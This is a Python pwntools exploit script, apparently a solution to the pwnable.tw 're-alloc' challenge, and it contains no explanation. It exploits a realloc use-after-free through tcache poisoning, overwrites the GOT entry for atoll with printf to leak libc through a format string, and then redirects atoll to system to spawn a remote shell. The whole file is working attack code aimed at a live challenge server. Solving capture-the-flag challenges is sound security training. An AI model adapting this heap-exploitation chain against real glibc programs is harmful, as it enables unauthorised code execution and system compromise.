#!/usr/bin/env python3

from pwn import *

exe = ELF('re-alloc_patched', checksec=False)
libc = ELF('libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+69

        
        ''')
        input()


if args.REMOTE:
    p = remote('chall.pwnable.tw', 10106)
else:
    p = process([exe.path])
# GDB()

def alloc(idx, size, data):
    slna(b'choice: ', 1)
    slna(b'Index:', idx)
    slna(b'Size:', size)
    sla(b'Data:', data)

def realloc(idx, size, data):
    slna(b'choice: ', 2)
    slna(b'Index:', idx)
    if size > 0:
        slna(b'Size:', size)
        sla(b'Data:', data)
    else:
        slna(b'Size:', size)
        p.recvuntil(b'alloc error', drop=True)

def rfree(idx):
    slna(b'choice: ', 3)
    slna(b'Index:', idx)

def exit():
    slna(b'choice: ', 4)

##########################
### STAGE 1: Leak libc ###
##########################
alloc(0, 0x18, b'A'*4)
realloc(0, 0, b'')
realloc(0, 0x18, p64(exe.got['atoll']))

alloc(1, 0x18, b'A')
realloc(1, 0x20, b'')
rfree(1)

realloc(0, 0x18, b'A'*8)
rfree(0)

alloc(0, 0x38, b'A'*4)
realloc(0, 0, b'')
realloc(0, 0x38, p64(exe.got['atoll']))

alloc(1, 0x38, b'A')
realloc(1, 0x48, b'')
rfree(1)
realloc(0, 0x50, b'A'*8)
rfree(0)

alloc(0, 0x38, p64(exe.plt['printf']))
slna(b'choice: ', 3)
sla(b'Index:', b'%7$p')
GDB()
libc_leak = int(p.recvline().strip(), 16)
libc.address = libc_leak - 0x1e5760
info("Libc leak: " + hex(libc_leak)) 
info("Libc base: " + hex(libc.address))

########################
### STAGE 2: Oneshot ###
########################
oneshot = [0xe21d1, 0xe22ee, 0xe2383, 0xe2386, 0x106ef8]
slna(b'choice: ', 1)
sla(b'Index:', b'')
slna(b'Size:', b'asdfasdf')
sla(b'Data:', p64(libc.sym['system']))

slna(b'choice: ', 1)
sla(b'Index:', b'sh')

p.interactive()
